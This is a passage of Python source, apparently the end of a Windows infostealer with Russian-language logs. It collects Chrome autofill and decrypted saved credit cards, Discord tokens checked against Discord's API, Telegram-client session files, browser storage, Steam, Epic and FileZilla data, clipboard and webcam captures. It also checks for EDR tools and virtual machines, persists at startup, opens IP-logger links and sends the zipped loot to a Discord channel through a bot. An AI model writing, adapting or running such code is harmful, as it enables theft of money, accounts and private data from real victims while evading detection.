                log(f"[✓] Бот {self.user} готов к отправке файла")
                channel = self.get_channel(DISCORD_CHANNEL_ID)
                if channel is None:
                    log("[!] Канал не найден")
                    await self.close()
                    return
                try:
                    await channel.send("📥 Логи очередного лоха:", file=discord.File(zip_path))
                    log("[✓] Архив успешно отправлен через Discord-бота")
                except Exception as e:
                    log(f"[!] Ошибка отправки: {e}")
                await self.close()
        bot = DiscordBot(intents=discord.Intents.default())
        bot.run(DISCORD_BOT_TOKEN)
    except Exception as e:
        log(f"[!] Ошибка при запуске Discord-бота: {e}")

# === ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ ===
def get_username():
    return os.getenv("USERNAME")

def get_os_version():
    return platform.version()

def get_windows_install_date():
    try:
        result = subprocess.check_output('powershell Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" | Select-Object -ExpandProperty InstallDate', shell=True, encoding="utf-8")
        install_date = datetime.datetime.fromtimestamp(int(result.strip())).strftime("%Y-%m-%d %H:%M:%S")
        return install_date
    except Exception as e:
        return f"[!] Ошибка получения даты установки: {e}"

def get_system_localization():
    try:
        lang = subprocess.check_output("powershell Get-WinSystemLocale", shell=True, encoding="utf-8")
        region = subprocess.check_output("powershell Get-WinHomeLocation", shell=True, encoding="utf-8")
        return f"Язык интерфейса: {lang}\nРегион: {region}"
    except Exception as e:
        return f"[!] Ошибка локализации: {e}"

def get_windows_license_status():
    try:
        result = subprocess.check_output("slmgr /xpr", shell=True, stderr=subprocess.STDOUT, encoding="utf-8")
        return result.strip()
    except Exception as e:
        return f"[!] Ошибка проверки лицензии: {e}"

def update_save_specs():
    username = get_username()
    os_version = get_os_version()
    install_date = get_windows_install_date()
    localization = get_system_localization()
    license_status = get_windows_license_status()
    specs_path = os.path.join(TMP_DIR, "specs.txt")
    with open(specs_path, "a", encoding="utf-8") as f:
        f.write(f"\nUsername: {username}")
        f.write(f"\nOS Version: {os_version}")
        f.write(f"\nInstall Date: {install_date}")
        f.write(f"\nLocalization: {localization}")
        f.write(f"\nLicense Status: {license_status}")

def save_network_history():
    try:
        output = subprocess.check_output("netsh wlan show interfaces", shell=True, encoding="cp866")
        with open(os.path.join(TMP_DIR, "network_history.txt"), "w") as f:
            f.write(output)
        log("[✓] История подключений к сети сохранена")
    except Exception as e:
        log(f"[!] Ошибка network history: {e}")

def save_gateway_and_provider():
    try:
        ipconfig = subprocess.check_output("ipconfig /all", shell=True, encoding="cp866")
        with open(os.path.join(TMP_DIR, "gateway_provider.txt"), "w") as f:
            f.write(ipconfig)
        log("[✓] Шлюз и провайдер сохранены")
    except Exception as e:
        log(f"[!] Ошибка gateway/provider: {e}")

def save_browser_autofill():
    def get_chrome_autofill():
        path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Web Data")
        if not os.path.exists(path):
            return ""
        tmp_db = os.path.join(TMP_DIR, "WebData_copy")
        shutil.copy2(path, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        res = "\n".join([f"{name}: {value}" for name, value in cursor.fetchall()])
        conn.close()
        os.remove(tmp_db)
        return res

    chrome = get_chrome_autofill()
    with open(os.path.join(TMP_DIR, "autofill.txt"), "w") as f:
        f.write("=== Chrome Autofill ===\n")
        f.write(chrome)
    log("[✓] Автозаполнение сохранено")

def save_browser_extensions():
    exts = []
    edge_ext_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Extensions")
    chrome_ext_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Extensions")
    for path in [edge_ext_path, chrome_ext_path]:
        if os.path.exists(path):
            for folder in os.listdir(path):
                exts.append(folder)
    with open(os.path.join(TMP_DIR, "browser_extensions.txt"), "w") as f:
        f.write("\n".join(exts))
    log("[✓] Расширения браузеров сохранены")

def save_credit_cards():
    def get_chrome_cards():
        path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Web Data")
        if not os.path.exists(path):
            return ""
        tmp_db = os.path.join(TMP_DIR, "WebData_copy")
        shutil.copy2(path, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT card_number_encrypted, date_modified FROM credit_cards")
        res = "\n".join([f"{win32crypt.CryptUnprotectData(card)[1].decode()} — {date}" for card, date in cursor.fetchall()])
        conn.close()
        os.remove(tmp_db)
        return res

    cards = get_chrome_cards()
    with open(os.path.join(TMP_DIR, "credit_cards.txt"), "w") as f:
        f.write("=== Credit Cards ===\n")
        f.write(cards)
    log("[✓] Кредитные карты сохранены")

def save_telegram_d_sessions():
    tg_dir = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
    if not os.path.exists(tg_dir):
        log("[!] Telegram не установлен")
        return
    session_files = [f for f in os.listdir(tg_dir) if f.endswith(".session")]
    if not session_files:
        log("[!] .session файлы не найдены")
        return
    with open(os.path.join(TMP_DIR, "telegram_sessions.txt"), "w", encoding="utf-8") as f:
        f.write("Найденные .session файлы:\n")
        for sess in session_files:
            f.write(sess + "\n")
            shutil.copy2(os.path.join(tg_dir, sess), os.path.join(TMP_DIR, sess))
    log("[✓] .session файлы Telegram сохранены")

def save_ayugram_sessions():
    tg_dir = os.path.join(os.getenv("APPDATA"), "Ayugram Desktop", "tdata")
    if not os.path.exists(tg_dir):
        log("[!] Telegram не установлен")
        return
    session_files = [f for f in os.listdir(tg_dir) if f.endswith(".session")]
    if not session_files:
        log("[!] .session файлы не найдены")
        return
    with open(os.path.join(TMP_DIR, "telegram_sessions.txt"), "w", encoding="utf-8") as f:
        f.write("Найденные .session файлы:\n")
        for sess in session_files:
            f.write(sess + "\n")
            shutil.copy2(os.path.join(tg_dir, sess), os.path.join(TMP_DIR, sess))
    log("[✓] .session файлы Telegram сохранены")

def save_nicegram_sessions():
    tg_dir = os.path.join(os.getenv("APPDATA"), "Nicegram Desktop", "tdata")
    if not os.path.exists(tg_dir):
        log("[!] Telegram не установлен")
        return
    session_files = [f for f in os.listdir(tg_dir) if f.endswith(".session")]
    if not session_files:
        log("[!] .session файлы не найдены")
        return
    with open(os.path.join(TMP_DIR, "telegram_sessions.txt"), "w", encoding="utf-8") as f:
        f.write("Найденные .session файлы:\n")
        for sess in session_files:
            f.write(sess + "\n")
            shutil.copy2(os.path.join(tg_dir, sess), os.path.join(TMP_DIR, sess))
    log("[✓] .session файлы Telegram сохранены")

def save_uptime():
    uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())
    with open(os.path.join(TMP_DIR, "uptime.txt"), "w") as f:
        f.write(str(uptime))
    log("[✓] Время работы системы сохранено")

def save_user_activity():
    try:
        recent_docs = os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Windows", "Recent")
        files = os.listdir(recent_docs) if os.path.exists(recent_docs) else []
        with open(os.path.join(TMP_DIR, "user_activity.txt"), "w") as f:
            f.write("\n".join(files))
        log("[✓] Активность пользователя сохранена")
    except Exception as e:
        log(f"[!] Ошибка сбора активности: {e}")

def save_clipboard():
    try:
        data = pyperclip.paste()
        with open(os.path.join(TMP_DIR, "clipboard.txt"), "w", encoding="utf-8") as f:
            f.write(data)
        log("[✓] Буфер обмена сохранён")
    except Exception as e:
        log(f"[!] Ошибка clipboard: {e}")

def save_bitlocker_status():
    try:
        result = subprocess.check_output(
            "manage-bde -status",
            shell=True,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="ignore"
        )
        with open(os.path.join(TMP_DIR, "bitlocker.txt"), "w", encoding="utf-8") as f:
            f.write(result)
        log("[✓] BitLocker статус сохранён")
    except Exception as e:
        log(f"[!] Ошибка BitLocker: {e}")

def get_local_users():
    try:
        result = subprocess.check_output("net user", shell=True, encoding="cp866")
        return result
    except Exception as e:
        return f"[!] Ошибка получения пользователей: {e}"

def detect_edr():
    edr_processes = ["EDR", "SentinelOne", "CrowdStrike", "Carbon Black"]
    detected = []
    for p in psutil.process_iter():
        for edr in edr_processes:
            if edr.lower() in p.name().lower():
                detected.append(p.name())
    with open(os.path.join(TMP_DIR, "edr_detection.txt"), "w") as f:
        f.write("\n".join(set(detected)))
    log("[✓] EDR решения найдены")

def save_firewall_status():
    try:
        result = subprocess.check_output(
            "netsh advfirewall show allprofiles",
            shell=True,
            stderr=subprocess.STDOUT,
            encoding="cp866",
            errors="replace"
        )
        with open(os.path.join(TMP_DIR, "firewall_status.txt"), "w", encoding="utf-8") as f:
            f.write(result)
        log("[✓] Статус фаервола сохранён")
    except Exception as e:
        log(f"[!] Ошибка фаервола: {e}")

def save_allowed_apps():
    try:
        result = subprocess.check_output("netsh advfirewall firewall show rule name=all", shell=True, encoding="cp866")
        with open(os.path.join(TMP_DIR, "allowed_apps.txt"), "w") as f:
            f.write(result)
        log("[✓] Разрешенные приложения сохранены")
    except Exception as e:
        log(f"[!] Ошибка разрешенных приложений: {e}")

def save_gpu_model():
    try:
        result = subprocess.check_output("wmic path win32_videocontroller get name", shell=True, encoding="utf-8")
        with open(os.path.join(TMP_DIR, "gpu.txt"), "w") as f:
            f.write(result)
        log("[✓] Видеокарта сохранена")
    except Exception as e:
        log(f"[!] Ошибка GPU: {e}")

def save_motherboard_vendor():
    try:
        result = subprocess.check_output("wmic baseboard get manufacturer", shell=True, encoding="utf-8")
        with open(os.path.join(TMP_DIR, "motherboard.txt"), "w") as f:
            f.write(result)
        log("[✓] Материнская плата сохранена")
    except Exception as e:
        log(f"[!] Ошибка motherboard: {e}")

def save_connected_devices():
    try:
        result = subprocess.check_output("powershell Get-PnpDevice -PresentOnly", shell=True, encoding="utf-8")
        with open(os.path.join(TMP_DIR, "connected_devices.txt"), "w") as f:
            f.write(result)
        log("[✓] Подключенные устройства сохранены")
    except Exception as e:
        log(f"[!] Ошибка устройств: {e}")

def save_browser_sessions():
    paths = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Local Storage"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Local Storage"),
        "Firefox": os.path.join(os.getenv("APPDATA"), r"Mozilla\Firefox\Profiles"),
        "Opera": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Local Storage")
    }
    with open(os.path.join(TMP_DIR, "browser_sessions.txt"), "w", encoding="utf-8") as f:
        for browser, path in paths.items():
            if os.path.exists(path):
                f.write(f"=== {browser} ===\n")
                try:
                    for root, _, files in os.walk(path):
                        for file in files:
                            if file.endswith(".localstorage"):
                                with open(os.path.join(root, file), "rb") as fl:
                                    content = fl.read().decode(errors="ignore")
                                    f.write(content + "\n---\n")
                except Exception as e:
                    f.write(f"[!] Ошибка чтения: {e}\n")
    log("[✓] Браузерные сессии сохранены")

def save_steam_full_info():
    steam_config_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "loginusers.vdf")
    webcache_path = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "htmlcache", "Cache")
    if not os.path.exists(steam_config_path):
        log("[!] Steam config не найден")
        return
    try:
        import vdf
        with open(steam_config_path, "r", encoding="utf-8", errors="ignore") as f:
            data = vdf.parse(f)
        users = data.get("users", {})
        with open(os.path.join(TMP_DIR, "steamfull.txt"), "w", encoding="utf-8") as f:
            for sid, info in users.items():
                name = info.get("PersonaName", "Неизвестно")
                remember = info.get("RememberPassword", "0")
                f.write(f"Steam ID: {sid}\nNickname: {name}\nRemember Password: {remember}\n---\n")
            f.write("\n[+] Попытка найти привязанные аккаунты...\n")
            if os.path.exists(webcache_path):
                for file in os.listdir(webcache_path):
                    if file.endswith(".tmp"):
                        try:
                            with open(os.path.join(webcache_path, file), "rb") as cache_file:
                                content = cache_file.read().decode(errors="ignore")
                                emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", content)
                                for email in set(emails):
                                    f.write(f"[!] Найденная почта: {email}\n")
                        except Exception:
                            continue
        log("[✓] Полная информация о Steam сохранена в steamfull.txt")
    except Exception as e:
        log(f"[!] Ошибка при парсинге Steam данных: {e}")

def save_clipboard_history():
    try:
        result = subprocess.check_output("powershell Get-Clipboard -Format Text -All", shell=True, encoding="utf-8", errors="ignore")
        with open(os.path.join(TMP_DIR, "clipboard_history.txt"), "w", encoding="utf-8") as f:
            f.write(result)
        log("[✓] История буфера обмена сохранена")
    except Exception as e:
        log(f"[!] Ошибка clipboard history: {e}")

def save_epic_games_info():
    epic_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "EpicGamesLauncher", "Saved", "Config", "Windows")
    if not os.path.exists(epic_path):
        log("[!] Epic Games не найден")
        return
    account_file = os.path.join(epic_path, "Account.ini")
    if os.path.exists(account_file):
        shutil.copy2(account_file, os.path.join(TMP_DIR, "epic_account.ini"))
        log("[✓] Файл Account.ini Epic Games сохранён")
    logs_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "EpicGamesLauncher", "Saved", "Logs")
    if os.path.exists(logs_path):
        for file in os.listdir(logs_path):
            src = os.path.join(logs_path, file)
            dst = os.path.join(TMP_DIR, "epic_logs", file)
            os.makedirs(os.path.join(TMP_DIR, "epic_logs"), exist_ok=True)
            if os.path.isfile(src):
                shutil.copy2(src, dst)
        log("[✓] Логи Epic Games сохранены")

def save_telegram_sessions():
    appdata = os.getenv("APPDATA")
    tg_path = os.path.join(appdata, "Telegram Desktop", "tdata")
    if os.path.exists(tg_path):
        session_files = [f for f in os.listdir(tg_path) if f.endswith(".session")]
        for f in session_files:
            src = os.path.join(tg_path, f)
            dst = os.path.join(TMP_DIR, f)
            shutil.copy2(src, dst)
        log(f"[✓] Telegram .session файлы сохранены: {len(session_files)}")
    else:
        log("[!] Telegram не установлен")

def iplogger_check():
   webbrowser.open('https://2no.co/Xijab')
   time.sleep(10)
   webbrowser.open('https://2no.co/1uKtX4')

def save_discordik_full_info():
    discord_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Discord", "Local Storage", "leveldb")
    if not os.path.exists(discord_path):
        log("[!] Discord не установлен")
        return
    tokens = []
    for file in os.listdir(discord_path):
        if file.endswith(".log") or file.endswith(".ldb"):
            try:
                with open(os.path.join(discord_path, file), "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\]][^\"]*", content)
                    tokens.extend(matches)
            except Exception:
                continue
    if not tokens:
        log("[!] Токены Discord не найдены")
        return
    import requests
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from win32crypt import CryptUnprotectData
    def decrypt_token(token: str):
        decoded = base64.b64decode(token.split(":")[2])
        return decoded[:30].hex()
    with open(os.path.join(TMP_DIR, "discordik.txt"), "w", encoding="utf-8") as f:
        for token in tokens:
            decrypted_part = decrypt_token(token)
            headers = {"Authorization": token}
            try:
                r = requests.get("https://discord.com/api/v9/users/ @me", headers=headers)
                if r.status_code == 200:
                    user_data = r.json()
                    username = f"{user_data['username']}#{user_data['discriminator']}"
                    email = user_data.get("email", "Не привязан")
                    phone = user_data.get("phone", "Не привязан")
                    nick = user_data.get("global_name", "Не указан")
                    f.write(f"Token: {token}\nDecrypted Part: {decrypted_part}\n"
                            f"Username: {username}\nNickname: {nick}\nEmail: {email}\nPhone: {phone}\n---\n")
                else:
                    f.write(f"Token: {token}\nStatus: Unauthorized\n---\n")
            except Exception as e:
                f.write(f"Token: {token}\nError: {e}\n---\n")
    log("[✓] Полная информация о Discord сохранена в discordik.txt")

def save_filezilla_data():
    appdata = os.getenv("APPDATA")
    fz_path = os.path.join(appdata, "FileZilla")
    if os.path.exists(fz_path):
        shutil.copytree(fz_path, os.path.join(TMP_DIR, "filezilla"))
        log("[✓] FileZilla данные сохранены")
    else:
        log("[!] FileZilla не установлен")

def detect_vm():
    try:
        result = subprocess.check_output("wmic computersystem get model", shell=True, encoding="utf-8")
        vm_strings = ["virtualbox", "vmware", "qemu", "bochs", "xen"]
        if any(vm in result.lower() for vm in vm_strings):
            with open(os.path.join(TMP_DIR, "machine.txt"), "w") as f:
                f.write("Virtual Machine Detected")
            log("[✓] Машина определена как виртуальная")
        else:
            with open(os.path.join(TMP_DIR, "machine.txt"), "w") as f:
                f.write("Physical Machine")
            log("[✓] Это физическая машина")
    except Exception as e:
        log(f"[!] Ошибка определения VM: {e}")

# === Основная функция ===
def main():
    log("[*] Начало работы")
    ensure_tmp_folder()
    add_to_startup()
    try:
        save_ip_info()
    except Exception as e:
        log(f"[!] Ошибка save_ip_info: {e}")
    try:
        save_wifi_info()
    except Exception as e:
        log(f"[!] Ошибка save_wifi_info: {e}")
    try:
        save_specs()
    except Exception as e:
        log(f"[!] Ошибка save_specs: {e}")
    try:
        update_save_specs()
    except Exception as e:
        log(f"[!] Ошибка update_save_specs: {e}")
    try:
        save_browsers()
    except Exception as e:
        log(f"[!] Ошибка save_browsers: {e}")
    try:
        save_startup()
    except Exception as e:
        log(f"[!] Ошибка save_startup: {e}")
    try:
        save_files_list()
    except Exception as e:
        log(f"[!] Ошибка save_files_list: {e}")
    try:
        save_env()
    except Exception as e:
        log(f"[!] Ошибка save_env: {e}")
    try:
        save_browser_history()
    except Exception as e:
        log(f"[!] Ошибка save_browser_history: {e}")
    try:
        save_discordik_full_info()
    except Exception as e:
        log(f"[!] Ошибка save_discordik_full_info: {e}")
    try:
        save_clipboard_history()
    except Exception as e:
        log(f"[!] Ошибка save_clipboard_history: {e}")
    try:
        save_chrome_passwords()
    except Exception as e:
        log(f"[!] Ошибка save_chrome_passwords: {e}")
    try:
        save_chrome_cookie()
    except Exception as e:
        log(f"[!] Ошибка save_chrome_cookie: {e}")
    try:
        save_edge_passwords_and_cookies()
    except Exception as e:
        log(f"[!] Ошибка save_edge_passwords_and_cookies: {e}")
    try:
        save_firefox_files()
    except Exception as e:
        log(f"[!] Ошибка save_firefox_files: {e}")
    try:
        collect_screenshots()
    except Exception as e:
        log(f"[!] Ошибка сбора скриншотов: {e}")
    try:
        capture_screenshot()
    except Exception as e:
        log(f"[!] Ошибка capture_screenshot: {e}")
    try:
        capture_webcam()
    except Exception as e:
        log(f"[!] Ошибка capture_webcam: {e}")
    try:
        save_mac_addresses()
    except Exception as e:
        log(f"[!] Ошибка save_mac_addresses: {e}")
    try:
        save_mac_addresse()
    except Exception as e:
        log(f"[!] Ошибка save_mac_addresse: {e}")
    try:
        save_installed_programs()
    except Exception as e:
        log(f"[!] Ошибка save_installed_programs: {e}")
    try:
        save_running_processes()
    except Exception as e:
        log(f"[!] Ошибка save_running_processes: {e}")
    try:
        save_usb_history()
    except Exception as e:
        log(f"[!] Ошибка save_usb_history: {e}")
    try:
        save_search_history()
    except Exception as e:
        log(f"[!] Ошибка save_search_history: {e}")
    try:
        save_browser_bookmarks()
    except Exception as e:
        log(f"[!] Ошибка save_browser_bookmarks: {e}")
    try:
        save_open_ports()
    except Exception as e:
        log(f"[!] Ошибка save_open_ports: {e}")
    try:
        save_dns_cache()
    except Exception as e:
        log(f"[!] Ошибка save_dns_cache: {e}")
    try:
        save_discord_data()
    except Exception as e:
        log(f"[!] Ошибка save_discord_data: {e}")
    try:
        save_steam_data()
    except Exception as e:
        log(f"[!] Ошибка save_steam_ {e}")
    try:
        save_windows_product_key()
    except Exception as e:
        log(f"[!] Ошибка save_windows_product_key: {e}")
    try:
        save_cmd_history()
    except Exception as e:
        log(f"[!] Ошибка save_cmd_history: {e}")
    try:
        save_antivirus_info()
    except Exception as e:
        log(f"[!] Ошибка save_antivirus_info: {e}")
    try:
        save_disk_info()
    except Exception as e:
        log(f"[!] Ошибка save_disk_info: {e}")
    try:
        save_last_reboot_time()
    except Exception as e:
        log(f"[!] Ошибка save_last_reboot_time: {e}")
    try:
        save_network_history()
    except Exception as e:
        log(f"[!] Ошибка save_network_history: {e}")
    try:
        save_gateway_and_provider()
    except Exception as e:
        log(f"[!] Ошибка save_gateway_and_provider: {e}")
    try:
        save_browser_autofill()
    except Exception as e:
        log(f"[!] Ошибка save_browser_autofill: {e}")
    try:
        save_browser_extensions()
    except Exception as e:
        log(f"[!] Ошибка save_browser_extensions: {e}")
    try:
        save_credit_cards()
    except Exception as e:
        log(f"[!] Ошибка save_credit_cards: {e}")
    try:
        save_epic_games_info()
    except Exception as e:
        log(f"[!] Ошибка save_credit_cards: {e}")
    try:
        save_uptime()
    except Exception as e:
        log(f"[!] Ошибка save_uptime: {e}")
    try:
        save_user_activity()
    except Exception as e:
        log(f"[!] Ошибка save_user_activity: {e}")
    try:
        save_clipboard()
    except Exception as e:
        log(f"[!] Ошибка save_clipboard: {e}")
    try:
        save_bitlocker_status()
    except Exception as e:
        log(f"[!] Ошибка save_bitlocker_status: {e}")
    try:
        detect_edr()
    except Exception as e:
        log(f"[!] Ошибка detect_edr: {e}")
    try:
        save_firewall_status()
    except Exception as e:
        log(f"[!] Ошибка save_firewall_status: {e}")
    try:
        save_allowed_apps()
    except Exception as e:
        log(f"[!] Ошибка save_allowed_apps: {e}")
    try:
        save_gpu_model()
    except Exception as e:
        log(f"[!] Ошибка save_gpu_model: {e}")
    try:
        save_motherboard_vendor()
    except Exception as e:
        log(f"[!] Ошибка save_motherboard_vendor: {e}")
    try:
        save_connected_devices()
    except Exception as e:
        log(f"[!] Ошибка save_connected_devices: {e}")
    try:
        save_telegram_sessions()
    except Exception as e:
        log(f"[!] Ошибка save_telegram_sessions: {e}")
    try:
        save_steam_data()
    except Exception as e:
        log(f"[!] Ошибка save_steam_ {e}")
    try:
        save_telegram_data()
    except Exception as e:
        log(f"[!] Ошибка save_telegram_data: {e}")
    try:
        save_discord_user()
    except Exception as e:
        log(f"[!] Ошибка save_discord_user: {e}")
    try:
        extract_telegram_nickname()
    except Exception as e:
        log(f"[!] Ошибка extract_telegram_nickname: {e}")
    try:
        save_nicegram_sessions()
    except Exception as e:
        log(f"[!] Ошибка save_nicegram_sessions: {e}")
    try:
        save_ayugram_sessions()
    except Exception as e:
        log(f"[!] Ошибка save_ayugram_sessions: {e}")
    try:
        save_telegram_d_sessions()
    except Exception as e:
        log(f"[!] Ошибка save_telegram_sessions: {e}")
    try:
        save_browser_sessions()
    except Exception as e:
        log(f"[!] Ошибка save_browser_sessions: {e}")
    try:
        save_filezilla_data()
    except Exception as e:
        log(f"[!] Ошибка save_filezilla_ {e}")
    try:
        save_steam_full_info()
    except Exception as e:
        log(f"[!] Ошибка save_steam_full_info: {e}")
    try:
        detect_vm()
    except Exception as e:
        log(f"[!] Ошибка detect_vm: {e}")
    try:
        iplogger_check()
    except Exception as e:
        log(f"[!] Ошибка логнуть челика на айпи лог: {e}")
    try:
        create_zip()
    except Exception as e:
        log(f"[!] Ошибка create_zip: {e}")
    try:
        send_zip_to_discord_bot()
    except Exception as e:
        log(f"[!] Ошибка send_zip_to_discord_bot: {e}")

if __name__ == "__main__":
    main()
